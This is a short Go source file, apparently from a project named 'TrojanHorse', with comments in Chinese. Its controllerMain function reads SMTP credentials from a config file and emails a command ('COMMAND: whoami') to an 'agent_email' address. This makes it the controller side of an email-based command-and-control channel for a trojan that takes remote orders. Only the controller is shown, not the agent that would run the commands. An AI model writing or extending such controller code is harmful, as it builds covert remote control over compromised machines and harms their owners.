package main

import (
	"TrojanHorse/email"
	"fmt"

	"github.com/spf13/viper"
)

func controllerMain() {
	// 读取配置文件
	viper.SetConfigFile("../config/config.yaml")
	err := viper.ReadInConfig()
	if err != nil {
		panic(fmt.Errorf("无法读取配置文件: %s", err))
	}

	// 初始化SMTP客户端
	smtpClient := email.NewSMTPClient(
		viper.GetString("smtp.host"),
		viper.GetString("smtp.port"),
		viper.GetString("smtp.username"),
		viper.GetString("smtp.password"),
	)

	// 发送测试命令
	err = smtpClient.SendEmail(
		viper.GetString("agent_email"),
		"COMMAND: whoami",
		"这是测试命令",
		nil,
	)
	if err != nil {
		panic(fmt.Errorf("发送邮件失败: %s", err))
	}

	fmt.Println("命令邮件已成功发送")
}
